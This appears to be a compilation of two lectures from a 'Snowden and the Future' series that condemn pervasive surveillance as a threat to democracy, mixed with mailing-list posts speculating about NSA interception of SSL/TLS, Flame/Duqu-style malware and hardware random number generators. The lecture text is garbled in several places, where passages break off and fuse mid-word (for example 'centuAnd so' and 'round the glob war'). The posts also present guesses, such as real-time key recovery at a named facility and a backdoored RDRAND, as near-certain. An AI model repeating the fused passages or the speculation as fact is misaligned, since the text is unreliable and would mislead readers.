fear. And I need not be Justice Brandeis to tell you that fear is the
enemy of reasoned, ordered liberty.
It is, of course, utterly inconsistent with the American ideal to
attempt to fasten the procedures of totalitarianism on American
constitutional self-governance. And this summer many of my dear
colleagues and comrades in our movement have spent much of time in the
United States pointing out that all of this is deeply is inconsistent
with some important American right not to be listened to. Which right
I too have, with them, and believe in deeply. But which it is not my
point primarily to assert just this moment. Partly, as I shall suggest
next time, because freedom is merely privilege extended unless enjoyed
by one and all. But primarily because there is an even deeper
inconsistency between American ideals and the subjection of every
other society on earth to the procedures of totalitarianism.
Freedom hath been hunted round the globe. Asia and Africa have long
expelled her. Europe has been bullied into treating her like a
stranger and England would take her into detention at Heathrow should
she arrive. The President of the United States has ordered everyone
not to receive the fugitive, and to prepare in time an asylum for
You see how it works when you rewrite Tom Paine without the morality
of freedom. And so our primary problem right now is that we allowed
them to export slavery to the world. All of which, in one form or
another, became clear, in one mind after another, within the bowels of
the empire and its listeners over the last decade.
William Binney—with whom we shall spend some time along the way—said
in a public speech "I left the NSA because the systems that I built
were turned against you. We had a legitimate charter in foreign
intelligence gathering, but then they went and turned those systems
against you—I didn't mean it, but they did it."
People began to understand within the system that it was being
sustained against democratic order, not with it. Because they knew
that what had come unmoored had come unmoored in the dark, and was
sailing without a flag. They were good people, and they began to
break. And when they broke, the system broke them back. In the end, at
least so far, until tomorrow, there was Mr. Snowden, who saw
everything that happened and watched what happened to the others.
He understood, as Chelsea Manning also always understood, that when
you wear the uniform you consent to the power. He knew his business
very well. Young as he was, as he said in Hong Kong, "I've been a spy
all my life," and I believe him. And so he did what you have to have
great courage to do, wherever you are, in the presence of what you
believe to be radical injustice. He wasn't first, he won't be last,
but he sacrificed his life to tell us things we needed to know.
Edward Snowden committed espionage on behalf of the human race.
Knowing the price, knowing the reason, knowing that it wouldn't be up
to him whether sacrificing his life was worth it.
So I would think that our most important effort, first, is to
understand the message: to understand its context, to understand its
purpose, to know its meaning, and to experience the consequences of
having received the communication.
Others will of course regard the first imperative as being to
eliminate the message, and the messenger, and the meaning: to render
everything as invisible as possible. Because invisibility is where
listeners have to live in order to work. But I think we must let them
go about that business. We must let them try to obliterate the message
as best they can, and do our work, which is the work of understanding
It will be difficult to judge, when you come to the moment where you
consider yourself either entitled or obliged to begin doing so. The
reason that it will be difficult to judge is that there is always much
to say on both sides when someone is greatly right too soon.
In the United States, those who were "premature anti-fascists"
suffered later. It was right to be right when all others were right.
And it was wrong to be right when only the people we didn't want to be
were already there.
I need not explain to you that it is possible to consider a man a
terrorist who tried to do too soon what we took four years and 750,000
lives in order to achieve, namely to free the slaves. And I do not
need to explain to you why it is that Gibbon considered the master key
to the tender respect of Augustus for a free constitution, which he
had destroyed, to be his fear.
The death of Caesar was always before his eyes, says Gibbon, and this
shaped his principles in politics. Augustus was sensible, says Gibbon,
that mankind is ruled by names; and he was not deceived in his
expectation that the Senate and the Romans would submit to slavery, so
long as they were respectfully assured that they kept all their
ancient freedom.
So there are some pieces that we need to put together in order to
understand. In the first place we must see the politics of now, both
as Mr. Snowden saw it, thus bringing us the message we must live with,
and as we see it in ourselves.
We shall consider, next time, the politics of our condition. I shall
suggest to you that it lies in this: if we are not doing anything
wrong, we have a right to resist. The nature of our freedom is that we
lose it because we do not exercise it. And the nature of our freedom
is not necessarily the one we find only in the books of law.
We shall consider two constitutional traditions in the United States
next time. One made by European people running away to be free and one
made by African people, forced into slavery, who had to run away, in
the United States, in order to be free. Two constitutional traditions
of resistance—differently structured and equally in our bones.
Now we must consider the relation that we have to the rest of the
human race in this, and ask ourselves whether we are seeking privilege
or something that belongs to all of humankind. For which it will be
necessary to understand the ideas of those who have risked their lives
to inform us, not because their ideas are necessarily privileged above
our own, but because they have sad experience from which to speak.
We must think about the role of all those working people in the
systems, both private and public, which constitute spying on humanity.
We must ask what they are telling us in their resistance and what our
side in their resistance ought to be. That workers were complaining in
the Gulf last week was making a question for global football. We might
want to be at least equally concerned with what we have learned from
the workers inside the matrix all this while.
We must ask what it means—both in the private and in the public world
of listening and spying and analyzing and concluding—this thing that
we're now calling "privacy," in relation to the thing that we used to
call freedom.
But of course, in the end, all of this would not be worth talking
about here, much less your coming to listen to me talk here, unless we
were going to talk about what we are actually going to do. If the
problem is that we slept too long, then plainly Mr. Snowden did not
come but to wake us up.
We shall see that there are both legal and political forms of
resistance around the world that we must all engage in. And I shall
show next time as best I can the possibilities down which we may
choose to take ourselves in that regard. But we must also change the
way we communicate, so as to restore the balance between what they can
and what they can't do.
Here lies the secret of Mr. Snowden's enormous sacrifice and their
enormous anger. Because the center of what Mr. Snowden has done is to
tell us what armor still works. He has spent his life now for us, to
tell us what we still have time to do if want to restore to the
technology of our communications the morality of freedom.
He has been quite precise. He has been quite careful. He has been most
thorough. He understands his business. He has spied on injustice for
us and he has told us what we needed to know. Despite the efforts
continuing every instant all around us, in a world becoming a safe and
dreary prison for their enemies, he has told us what we require in
order to do the job and get it right. And if we have a responsibility
at all, then part of our responsibility is to learn, now, before
somebody concludes that learning should be prohibited.
Which never happens in a free society.
I wish we weren't here. I don't wish that I wasn't here more than I
wish you weren't here. I wish us all out of this war. Twelve years—the
longest war in history of this society, nowhere concluded, nowhere
near finishing, nowhere capable of being defined as done.
We went from listening to armies and embassies to listening to global
trade and now we are fastening spying on entire societies, with a
skill and energy that only a growing empire can still manage. We shall
talk about the world where a nation of 1.3 billion people gains a
Content Monitoring System in sixteen months, against the ordinary
suppositions of every Indian person who thinks, "they can't do that."
But, thanks to the new Bechtel, Booz Allen Hamilton—erstwhile employer
of one Edward J. Snowden—yes they can.
The procedures—mind you only the procedures—of totalitarianism are a
leading American export these days. I wish we weren't here. I wish
that everything we thought we did in the twentieth century we had
accomplished. I wish we had defeated totalitarianism. I wish we had
eliminated smallpox. I wish that we were growing the Net that we
deserve to have, in which every human brain could learn and every
human being could grow, nourished by the knowledge and the support of
all the others.
There may come a day. But if we have only one more river to cross
before we get to freedom, it's a deep one, and it runs fast the other
way. And those who want to bring us out are going to be called
traitors—they are. And God forbid that they should lift their hands in
anger, or they will be slaughtered. And those who do it will feel they
have all the right on their side.
It is wrong to be right too soon.
It's wrong to be right too soon, but it is not too soon to be right
now. Because if we're not right now, then they will remember our
failure for fifteen centuries. And they will say of us, oppressed by
the weight of our corruption, and our fear of terrorist violence, that
we were ready to submit so long as we were assured that we possessed
our ancient freedoms. And as for everybody else—if not "Civis romanus
sum," then who are you?
Which is no way for us to be talking. Not now, not ever.
We have wandered so far into the dark that we have lost who we are.
Like many a tragic figure in history, Mr. Snowden went further out
into the dark in the hope that he could lead us back.
We had better do our best to learn from him what we can, as we watch
his light vanish into the darkness.

those who find this incredible* need to remember that Flame/Duqu style
attacks (they are just one instance of a family of systems and
programs) have been accelerating and improving since the mid aughts.
the only thing i am surprised by is the lack of infection of mobile
devices; this would be a logical and expected lateral transition or
even infection vector; there is no mention (yet).
the massive stockpile of weaponized 0days, covert exfiltration, and
espionage infrastructure will come to light sooner or later.  we've
only begun to see the outline of what has been wrought with $billions
applied over years by multiple actors...
* some have confused the audio malware channel with audio as infection
vector - this is not the case. from my reading the audio communication
is occurring between infected systems, not a vector for initial
infection. (now _that_ would be a feat ;)

Oh, Freedom - Part II
Good afternoon.
Since we were last here the press of the world has been full of
information concerning the practices of the US listeners, and
statements from Presidents, Premieres, Chancellors, and Senators on
the subject.
Our purpose this time being to consider the political meaning of Mr.
Snowden and the future he has brought us, we must begin by discarding
for immediate purposes pretty much everything said by the Presidents,
the Premieres, the Chancellors, and the Senators. It has been a
remarkable display of misdirection and misleading, and outright lying.
We'll come back to it, but it will not serve us at the outset.
It is indeed really what doesn't matter—all this froth, that we've
been reading since we were last together, from the respondents. We
need to keep our eye on the thinking behind Mr. Snowden's
activities—which he has done much more to explain since we were last
together—and we need to understand the message he has sent us. And so,
for that purpose, I come again before you.
What matters most—and what it has been the goal of the Presidents, the
Chancellors, the Premieres, and the Senators not to say—is how deeply
the whole of the human race has been ensnared in this process of
pervasive surveillance that destroys freedom.
The fastening of the procedures of totalitarianism on the human race
is the political subject about which Mr. Snowden has summoned us to an
urgent inquiry. And it is that inquiry which it has been the goal of
pretty much everybody responding on behalf of any Government or State
not just to ignore but to obscure.
We begin therefore where they are determined not to end, with the
question whether any form of democratic self-government, anywhere, is
consistent with the kind of massive, pervasive, surveillance into
which the Unites States government has led not only us but the world.
This should not actually be a complicated inquiry.
For almost everyone who lived through the 20th century—at least its
middle half—the idea that freedom was consistent with the procedures
of totalitarianism was self-evidently false.
Those who fought against it, those who sacrificed their lives to it
and had to begin again as displaced persons and refugees around the
world, and those who suffered under the harrow of it were all
perfectly clear that a society that listens to every telephone call,
spies on every meetings, keeps track of everybody's movements is
incompatible with a scheme of ordered liberty, as Justice Benjamin
Cardozo defined American constitutional freedom.
But at the beginning of the 21st century, what seemed clear and
absolutely unnecessary to inquire into in the 20th is now, apparently,
a question.
So we had better address it directly.
Many millions of people in the United States have in their family
tree, in their genetic material, in their understanding of the world,
visceral awareness of a system that tracked their ancestors'
movements, and for even the most trivial journey required they have a
pass. A system that gave some people the right to scrutinize every
communication of everybody else, that made almost every home subject
to intrusion and disruption at the whim of illegitimate power. For
those who have tasted the bitterness of slavery in their past, it
should not be necessary to explain why powers—however velvet the glove
in which they are contained may be, however invisible the system
within with they are embedded—that keep track, that listen everywhere,
whose intrusion knows no boundaries, are the powers of masters over
We should therefore not need to inquire, carrying as we do our own
history closest, whether a system of power which listens everywhere,
which can go everywhere, which keeps track of everybody's thoughts,
feelings, and speech, is inconsistent with freedom. We know, because
we have lived on both sides of such a system. And we know its evil.
But let us forget what we have learned by bitter experience, what we
carry in our own breasts, let us forget it, let us put it aside, let
us be law professors, shall we, and political scientists:
For analytical purposes let us take this word "privacy," that we are
growing accustomed to using quite freely, and see what it really is.
Privacy—as we use the word in our conversations now all around the
world, and particularly when we talk about the net— really means three
The first is secrecy, which our ability to keep messages "private," so
that their content is known only to those who we intend to receive
The second is anonymity, which is our ability to keep our
messages—even when their content is open—obscure as to who has
published them and who is receiving them. It is very important that
anonymity is an interest we can have in both our publishing and our
The third is autonomy, which is our ability to make our life decisions
free any force which has violated our secrecy or our anonymity.
These three are the principle components of the mixture that we call
"privacy". With respect to each, further consideration shows that it
is a precondition to the order that we call "democracy", "ordered
liberty", "self-government", to the particular scheme that we call in
the United States "constitutional freedom."
Without secrecy, democratic self-government is impossible. Because
people may not discuss public affairs with those they choose,
excluding those with whom they do not wish to converse. If you have
lived in a society where in every dorm room, every work place, every
public transport vehicle, there was an agent, whose job it was to
listen and inform, once you think about the consequences for political
conversation in that neighborhood, you need go no further. If you are
fortunate enough never to have had that experience, most of your
comrades around the world can enlighten you.
Anonymity is necessary for the conduct of democratic politics. The
United States Supreme Court took until 1995 to recognize it, but it
did, and to Justice Stevens we a owe clear statement of the importance
of anonymous political conversation at the core of the First
Amendment. The cases in which the Court has considered the anonymity
right are precisely cases about political communication, central cases
about the exercise of democracy. It is, as Justice Stevens noted in
McIntyre, not terribly surprising that our greatest artifact of divine
constitutional wisdom—a set of political pamphlets penned by three
very slippery characters called Hamilton, Madison, and Jay that we
refer to as The Federalist Papers—were of course published under a
That autonomy is vitiated by the wholesale invasion of secrecy and
privacy, that free decision making is impossible in a society where
every move is monitored, those of you who have friends in North Korea
may enquire into directly, if you please. But equally, any
conversation with those who lived through 20th century
totalitarianisms or any contact with the realities of American slavery
will surely clear it up for you.
In other words—though it shouldn't be necessary to demonstrate, though
we ought to have taken the bitter experience of American history in
the 19th century and the history of the West in the 20th for
sufficient demonstration—for those who really do like ignoring the
facts and working it out abstractly, with chalk, privacy is a
requirement of democratic self-government. The effort to fasten the
procedures of pervasive surveillance on human society is the
antithesis of liberty.
This is the conversation that all the "Don't listen to my mobile
phone!" has been not about for the last two weeks. If it were up to
power, the conversation would remain at that phony level forever.
So we are, at the moment—thanks to Mr. Snowden, who has precipitated
what even his adversaries now like to call a "necessary
conversation"—we are now in a necessary conversation with parties on
the other side who do not wish to explain exactly what they do. They
have advanced, and will advance, no convincing argument that what they
do is compatible with the morality of freedom, with US constitutional
law, or with the human rights of every person in the world. Indeed,
they will not offer any argument. They will certainly not offer a
defense. They will instead attempt, as much as possible, to change the
subject, and, wherever they cannot change the subject, to blame the
But what you have seen around the world in the last two weeks is the
evidence that this is extremely unlikely to work.
And so we need to consider the political environment created by what
has happened, before we can begin to address the more or less empty
rhetoric that has been assigned to the Presidents, the Chancellors,
and the Premieres.
"Why are they all operating in this way," you may ask nonetheless, "as
though everybody were on the same side?"
Here the history is very clear and remarkably available. One does not
need access to classified documents to see—including in records we
will be making public as part of our effort in "Snowden and the
Future" over the next two weeks—how the military and strategic
thinkers in the United States adapted to the end of the Cold War by
planning pervasive surveillance of the world's societies.
In the early 1990's, in documents that are in no way secret, the US
strategic and military planners made clear in a range of fora—from the
think tanks, the Pentagon, in research reports and conference
proceedings—that they foresaw, as indeed we now observe, a world in
which the United States had no significant state adversary, and would
be instead engaged in a series of "asymmetric conflicts." That was the
phrase, meaning "guerrilla wars."
In the course of that redefinition of the US threat assessments and
strategic posture after the end of the cold war, the American military
strategists and their intelligence community colleagues came to regard
American rights in communications privacy as the equivalent of
sanctuary for guerrillas.
The documents from 1992, 1993 are very clear in describing precisely
that relationship. It was understood that in future asymmetric
conflicts the adversaries—that means people, you understand, bad
people committed to bad activity but small groups of individuals
affiliated with and possessing the power of no state—would use
communications facilities that benefited from American civil liberties
as sanctuary, and that it would be necessary for the US military, the
listeners, to go after the "sanctuaries."
Of course, this was the position of military strategists and their
listener colleagues. It was not national policy. But it was an
important albeit relatively quiet part of the policy formation
discussion. There were, however, political adults in the room. And
while the United States government considered various efforts at
improving its ability to listen to encrypted communications in the
mid-90's—the Clinton administration had the Clipper Chip initiative
for example. There were also significant efforts to ensure that
domestic law enforcement would not be disadvantaged by the movement to
digital communications. These lead in 1995 to the CALEA statute
mandating the availability of "wiretapping" technical facilities in
digital telephone systems that didn't natively offer them—a compromise
which split the young Electronic Frontier Foundation into two camps,
one of which became CDT.
Although there were these steps taken to facilitate not only the work
of the domestic law enforcement agencies but also the listeners within
the United States—this we now know, as we see the evolution of the
FISA statute in the FISA court, secret judicature we couldn't see
before—still and all there was a clear understanding. This idea of
denying "sanctuary" by breaching American civil liberties in US-based
communications was not part of the senior policy-making outlook—it was
part of what one team constantly pushed for.
This they did after the first World Trade Center bombing, after the
Africa embassy bombings, after the Cole. The whole pervasive
surveillance system, not just the Patriot Act but all the pieces that
we now understand surrounded it in the secret world's understanding,
were constantly advocated for at the end of the 20th century, and as
constantly rebuffed.
And then, as we saw last time, at the opening of the 21st century a US
Administration which will go down in history infamous for its tendency
to think last and shoot first bought—hook, line, and sinker—the entire
"denying sanctuary," pervasive surveillance, "total information
awareness" scheme. Within a very short time after January 2002, mostly
in secret, they put it all together.
The consequences around the world were remarkably uncontroversial. By
and large, states approved or accepted. Some of this happened because
the United Stated government was even then using quite extraordinary
muscle around the world—after September of 2001 you were either with
us or you were against us. But it also happened because so many other
governments had come to base their national security systems crucially
on cooperation with American listening. And after the declaration of
the new Global War on Terror, that became only more true.
By the time the present Administration had settled into office in the
United States, as one senior official with relevant responsibility
described it to me half-way through the first term, in our government
to government relationships about the Net, "all of us—-the Chinese,
the Europeans, and Us," that was 'all of us' at the table, "—we all
agree about one thing, about exfiltration." (This is the listeners'
word for spying: "exfiltration." They "exfiltrate" data off our
networks into theirwarehouses.) "We all agree," this official said,
"about exfiltration: everybody agrees that it can't be stopped and it
shouldn't be limited. We disagree about what kinds of intervention,"
that is, breaking things in the Net, "should be allowed."
The important point for present purposes in this one conversation
(which could be drawn just as well from many other unclassified
sources) was that senior US policy makers thought there was general
consensus around the world that everybody could listen to everybody's
societies; it could not be stopped it shouldn't be limited. The
Chinese agreed. The US agreed. The Europeans agreed, which really
meant of course that they were dependent on US listening and hadn't a
lot of power to object.
Nobody told the people of the world.
What was common understanding among the policy-making elite—who
governed among them still only about a third of the world's
population—was that global civil society was a free fire zone for
everybody's listeners, and there wasn't anything to be said about
it—particularly not to all those people, who were supposed to not
This is the condition upon which the whistles started to blow all over
the field, as I said last time. Throughout the distressingly
situational ethics of this, a few people—all of them in the English
speaking world, all of the, people who came from societies with strong
traditions of the rule of law, protection for whistle-blowers, some
form of civilian political control over domestic security
intelligence—courageous and indignant whistle-blowers began to speak
Mr. Snowden saw what happened to precedent whistle-blowers, and
behaved accordingly.
What had opened by the end of the first decade of the 21st century was
a gap between what the people of the world thought their rights were
and what their governments had given away in return for intelligence
useful only to thy have adopted a misleading metric; they think if a
program produces anything it is justified.
Because of course the very essence of democracy is that it is for the
people to judge what is justified with respect to invasions of their
entrenched and fortified rights.
And I think that Mr. Snowden means—as certainly I and my comrades
mean—that in the exercise of the democratic discretion to determine
whether we wish to fasten these procedures of totalitarianism on other
people in the world, that we should consider our values as extending
beyond our borders.
We mean—and I think Mr Snowden means with us—that we should make those
decisions not in the narrow, selfish self-interest that is raison
d'etat, but with some heightened moral sense of what it is appropriate
for a beacon of liberty to humanity to do.
We will speak, of course, about American constitutional law and about
the importance of American legal phenomena—rules, protections, rights,
duties—with respect to all of this. But we should be clear that, when
we talk about the American constitutional tradition with respect to
freedom and slavery, we're talking about more than what is written in
the law books.
We face now a global system in which the States have, almost without
exception, agreed complicitiously to deliver over their people to a
form of pervasive spying which we know is incompatible with our own
liberty and with the liberty that we have frequently postured in the
world as bringing to the human race as a whole. We know this. As
individual citizens we are now aware. Mr. Snowden has made it
impossible for us to ignore this fact unless we bury our heads so deep
in the sand that we are likely to suffocate.
But we face two claims—you meet them everywhere you turn—which
summarize the politics against which we are working. One argument
says, "It's hopeless, privacy is gone, why struggle?" The other says,
"I'm not doing anything wrong, why should I care?"
And these—neither one of them a brilliant argument from a political
point of view—these are actually the most significant forms of
opposition that we face in doing what we know we ought to do.
In the first place, the premise of my being here before you is that it
is far from hopeless. Mr. Snowden has described to us, as I told you
last time, what armor still works. Mr. Snowden's purpose was to
explain to us how to distinguish between those forms of network
communication that are hopelessly corrupted and no longer usable,
those that are endangered by a continuing assault on the part of an
agency gone rogue, and those which even with their vast power, all
their wealth, and all their misplaced ambition, conscientious, and
effort, they still cannot break.
Hopelessness is merely what you are supposed to get, not what you have to have.
And so far as the other argument is concerned, we owe it to ourselves
to be quite clear in response. My own personal position I recommend to
my comrades around the world: If we are not doing anything wrong. then
we have a right to resist.
If we are not doing anything wrong, then we have a right to do
everything we can to maintain the traditional balance between us and
power that is listening. We have a right to be obscure. We have a
right to mumble. We have a right to speak languages they do not get.
We have a right to meet when and where and how we please so as to
evade the paddy rollers.
We have an American constitutional tradition against general warrants.
It was formed in the 18th century for good reason. It puts the limit
of the State's ability to search and seize at what you can convince a
neutral magistrate, in a particular situation—about one place, one
time, one thing—is a reasonable use of governmental power.
That principle was dear to the First Congress which put it in the Bill
of Rights, because it was dear to British North Americans, because in
the course of the 18th centuAnd so the constitutional tradition we
should be defending, now, as Americans, is a tradition which extends
far beyond whatever boundary the Fourth Amendment has in space, place,
or time. We should be defending not merely a right to be free from the
oppressive attentions of the national government, not merely fighting
for something embodied in the Due Process Clause of the 14th Amendment
after 1961, because of a trunk of smut left behind by a departing
lodger in Mrs. Mapp's boarding house in Ohio. We should be rather be
fighting against the procedures of totalitarianism because slavery is
wrong; because fastening it on the human race is wrong; because
providing the energy, the money, the technology, the system for
subduing everybody's privacy around the world—for destroying sanctuary
in American freedom of speech—is wrong.
And if we're going to exercise our democratic rights in the United
States as Mr. Snowden wishes us to do—and has given us the most
valuable thing that democratic self-governing people can have, namely
information about what is going on—if we are to do all that, then we
should have clear in our mind the political ideas upon which we ought
to be acting. They are not parochial, or national, or found in the
U.S. Reports alone.
A nation conceived in liberty, and dedicated to the proposition that
all men are created equal, enslaved millions of people. It washed away
that sin in a terrible war We should learn from that, as we are called
upon now to do.
The politics that we have as Americans are slightly more complicated,
but they are fundamentally the same as the lines upon which our
colleagues and comrades around the world must also move. Everywhere
citizens must demand two things of their governments:
In the first place, you have a responsibility, a duty, to protect our
rights by guarding us against the spying of outsiders. Every
government has that responsibility. Every government has the
responsibility to protect the rights of its citizens to be free from
the intrusive spying of outsiders. No government can pretend to
sovereignty and responsibility with respect to its citizens unless it
makes every effort within its power and its means to ensure that
In the second place, every government around the world must subject
its domestic listening to the rule of law.
Now this is the tragedy, where the overwhelming arrogance of the
listeners has left the American government. The government of the
United States could have held up its head until the day before
yesterday and said that its listeners, unlike all the other listeners
in the world, were subject to the rule of law. It would have been an
accurate boast.
To be sure the rule of law even in the last generation was somewhat
corrupted by secret judicature, and a court appointed by a single
decision maker, and so on and so on. But the truth is that American
listening was subject to the rule of law as no one else's was in the
world or is now.
For nothing, history will record, they threw that away. For nothing
they threw that away.
But it is true everywhere—whether we are here, or we are in China or
we are in Germany, or we are in Spain, or wherever we are—those two
basic principles of our politics are uniformly applicable: our
government must defend us against pervasive spying by outsiders, and
our government must subject listening to the rule of law at home.
To the citizens of the United States a greater responsibility is given
because we must act to subject our government to control in the
listening it is doing to hundreds of millions and ultimately billions
of people around the world. Ours is the government that is projecting
immensities of power into the destruction in the world's societies and
ours is the government which must be put under democratic control with
respect to that listening. It is our principles in favorem libertatis
which must be the dominant principles in that story.
Freedom has been hunted round the glob war, a Net which no longer uses
surveillance to destroy the privacy that founds democracy.
This is a matter of international public law. In the end this is about
something like prohibiting chemical weapons, or land mines. A matter
of disarmament treaties. A matter of peace enforcement.
Pervasive surveillance of other peoples' societies is wrong and we
must not do it. Our politics, everywhere around the world, are going
to have to be based in the restoration of the morality of freedom,
which it is the job of democracy to do.
The difficulty is that we have not only our good and patriotic fellow
citizens to deal with, for whom an election is a sufficient remedy,
but we have also an immense structure of private surveillance that has
come into existence. a structure which has every right to exist in a
free market but which is now creating ecological disaster from which
governments alone have benefited. From which people have been rendered
far less well off than they think they are, and than they should have
You don't need today's Washington Post on the subject of the massive
interception of information flowing in and out of Google and Yahoo—and
soon it will be Facebook and Microsoft's cloud—as we begin to
understand what government is doing with "the cloud." You don't need
any of that to understand that at the end of the day, we have to
assess not only what the States have done, but also what unregulated
enterprise has done, to the ecology of privacy
We have to consider not only, therefore, what our politics are with
respect to the States but also with respect to the enterprises. This
is the subject of our talk next time.
But for now we are left attending a puppet show in which the people
who are the legitimate objects of international surveillance—namely
politicians, heads of state, military officers, and diplomats—are
yelling and screaming about how they should not be listened to. As
though they were us and had a right to be left alone.
And that, of course, is what they want. They want to confuse us. They
want us to think that they are us—that they're not the people who
allowed this to happen, who cheered it on, who went into to business
with it.
The literature of our time has not been deceptive about this. If one
reads John le Carre's views about the security industry in Germany
under the Global War on Terror (he, as you recall, had his actual
experiences as an intelligence officer on behalf of the British
government in Germany), if you look at what A Most Wanted Man says
about the nature of the cooperation between the Germans and the
Americans, and its effect on freedom, you will discover that after all
everybody really did know—except you.
The purpose of secrecy was to keep you in the dark. The purpose of
secrecy was not to prevent the States from knowing what they were
doing: their left hands and their right hands knew perfectly well what
they were up to.
We're going to have to cope with the problems their deceptions
created. Because among the things that our listeners have destroyed is
the Internet freedom policy of the United States government. They had
a good game that they were playing both sides of. But now we have
comrades and colleagues around the world—working for the freedom of
the Net in dangerous societies—who have depended upon material support
and assistance from the United States government, and who now have
every reason to be worried and to be frightened.
What if the underground railroad had been constantly under efforts of
penetration by the United States government on behalf of slavery?
What if every book for the last five hundred years had been reporting
its readers at headquarters?
People talk about this as though it were a matter of the publicity of
what we publish rather than the destruction of the anonymity of what
we read. We will have to look next time very closely at what
commercial surveillance really does and how it really does it in order
to understand what our politics have to be. Because there, as here,
deception, misdirection—waving the handkerchief over here so you do
not see what the other hand is doing—is the whole secret to how it
The bad news for the people of the world is you were lied to
thoroughly by everybody for nearly twenty years. The good news is that
Mr. Snowden has told you the truth.
But if we really believe that the truth will set us free, we had
better do it now.

@_subject: regarding the NSA crypto "breakthrough" 
of all the no such agency disclosures, this one fuels the most wild speculation.
James Bamford, a veteran chronicler of the NSA, describes the agency
as having made "an enormous breakthrough several years ago in its
ability to cryptanalyze, or break, unfathomably complex encryption
systems employed by not only governments around the world but also
many average computer users". That sounds a lot like saying that the
the spooks have managed to break at least some of the cryptographic
codes that protect everything from secure e-mail to e-commerce.
however, the crypto breakthrough discussed is more mundane:
 deployment of deep packet inspection with SSL/TLS capabilities.[0]
this represents three significant efforts:
1. upgrading physical infrastructure (DPI systems at this scale use
ASICs for processing, not software which can be upgraded on demand.)
2. secret partnerships with service providers to obtain server SSL/TLS
secret keys.
3. key distribution to provision the DPI classifiers/sniffers with
requisite secret keys when updated by service providers.
hence, a "crypto breakthrough" providing unprecedented actionable
visibility into previously opaque streams, with such inspection
occurring at the edges rather than the mothership (where all encrypted
data is sent, decryptable or not...)
these efforts are compartmented, with few aware of how these different
pieces fit together, thus fueling speculation about the nature of this
break.  from a technician point of view, you would notice the new
ability to see inside SSL traffic, but may not understand how it was
done. (e.g. with keys handed over in secret agreement for "reasonable
compensation" and national security, rather than a basement full of
quantum computers breaking web server keys...)
class break in discrete log?  quantum code crackers?
 you've been watching too much Sneakers![1]
0. "SSL: Intercepted today, decrypted tomorrow" , should read "SSL:
Intercepted and decrypted in real-time, almost everywhere"
   less than a third of a percent of SSL/TLS web traffic uses forward secrecy!

References: i asked Snowden for an authoritative copy... ;P
there's lots of disinformation around this topic, comparisons and
analogies that indicate this has been filtered through less technical
he can't say much about specifics, remember?
see above regarding technical vs. non-technical.  for the high ups,
getting access to encrypted communication is "breaking encryption".
whether that is breaking by cooperative agreement and new hardware, or
breaking by new attacks on crypto primitives themselves, it is
indistinguishable to them but makes all the difference to us.
to walk through with rough ballpark but by no means representative numbers,
- modern CPU - 1,500 to 9,000 sessions per second
- "typical web 2.0 service provider"
  - SSL ops: 800k/min, 13,333/sec (no keep-alive)
  - Bandwidth: 24kB/s or 200kbps (no CDN)
verdict: medium to large internet sites can offload SSL/TLS to their
front-end load balancers or servers without much effort. crypto
accelerators no longer required (unless used for HSM protection of
server keys). Google proved this.
now do the math for OC48 passive drops feeding the DPI collectors:
- for sake of argument, consider just 5% of channel capacity using
SSL/TLS: 2.5Gb / 20 == 125Mb/sec
- for sake of argument, consider 5k/sec sessions per 200kbps (gloss
over specific algo. overhead)
- 125Mb/200kb= 625 times more load than our provider example above
with 3.1mm sessions/sec.
verdict: you need a rack of servers at each collection point just to
extract keys for the DPI sniffer.
summary: NSA "breakthrough" at the Multiprogram Research Facility, or
Building 5300, is a system for the real-time recovery of session keys
from public key exchanges, which do not implement forward secrecy, the
session keys then used for DPI of SSL/TLS traffic. (AES faster and
easier to do in hardware, solved already.)
conveniently enough the real-time support can be applied retroactively
against all stored encrypted communications (c.f. NSA Utah) which are
now vulnerable to recovery as server public keys for the period in
question are handed over, taken, or cracked.
what would be even more interesting is if Building 5300 also built a
TWIRL[0] or SHARK[1] device to get the 1028 bit secret keys used by
servers all over the world for their traffic, thus achieving DPI-SSL
visibility for non-cooperative entities.
to the critics:
sorry, i have nothing to prove. there hints are out there, but sadly,
you'll just have to take me at face value or dig along with others
until you've got your own compelling picture of what this entails.
like a good spy or journo, i don't burn intelligence sources; least of
all just to prove i'm right on the internets ;P

and some relevant points of interest from the guardian article:
A 10-year NSA program against encryption technologies made a
breakthrough in 2010 which made "vast amounts" of data collected
through internet cable taps newly "exploitable"...
-[ED: newly exploitable in real-time, even back in time for new keys
applicable to stored sessions]
The NSA spends $250m a year on a program which, among other goals,
works with technology companies to "covertly influence" their product
-[ED: now this budget area i'd love to see on a line item basis...]
"For the past decade, NSA has lead [sic] an aggressive, multi-pronged
effort to break widely used internet encryption technologies," stated
a 2010 GCHQ document. "Vast amounts of encrypted internet data which
have up till now been discarded are now exploitable."
-[ED: note how if they can't DPI it at the origin, they consider it
discarded.  however, as mentioned, this just means it is placed into
long term storage for later analysis.]
The breakthrough, which was not described in detail in the documents,
meant the intelligence agencies were able to monitor "large amounts"
of data flowing through the world's fibre-optic cables and break its
encryption, despite assurances from internet company executives that
this data was beyond the reach of government.
Among other things, the program is designed to "insert vulnerabilities
into commercial encryption systems". These would be known to the NSA,
but to no one else, including ordinary customers, who are tellingly
referred to in the document as "adversaries". "These design changes
make the systems in question exploitable through Sigint collection …
with foreknowledge of the modification. To the consumer and other
adversaries, however, the systems' security remains intact."
-[ED: a compromised RDRAND becomes a fancy linear generator and only
NSA (and Intel) would know your random bits are totally predictable.]
Among the specific accomplishments for 2013, the NSA expects the
program to obtain access to "data flowing through a hub for a major
communications provider" and to a "major internet peer-to-peer voice
and text communications system".

assumptions like "SSL private keys are kept on the servers, not
provided to third parties" ... for national security reasons.
assumptions like "i'm using ZRTP, my call is end-to-end secure!" (why
the !^ is ZRTP termination the usual mode in VoIP server
implementations? E.g. wiretap mode. Oh, nevermind...)
the list goes on.
you'll notice that all of the targets mentioned above have a public

there was the "Athens Affair", aka "Greek wiretapping case 2004–05"
December 2006 Vodafone Greece was fined €76 million by the
Communications Privacy Protection Authority, a Greek privacy watchdog
group, for the illegal wiretapping of 106 cellphones. The fine were
calculated as €500,000 for each phone that was eavesdropped on, as
well as a €15 million fine for impeding their investigation.
October 19, 2007, Vodafone Greece was again fined €19 million by EETT,
the national telecommunications regulator, for alleged breach of
privacy rules.

the only decent on-die RNG i have used was XSTORE[0] from VIA Padlock
which allowed you very high speed access to the raw, unwhitened output
of the hardware RNG sourece(s). you could read from both at twice the

it was then up to a user-space daemon to read this raw source and
perform cursory and long-lived checks, even benchmarks against large
volumes of TBytes of output for extended confirmation (looking at you
the user-space daemon, having then verified the hardware entropy
sources, performs computation blinding and compression (e.g. hashing

entropy pool via write to /dev/random.
RDRAND/RDSEED can not be used a trusted manner with access to the
unwhitened, raw output.
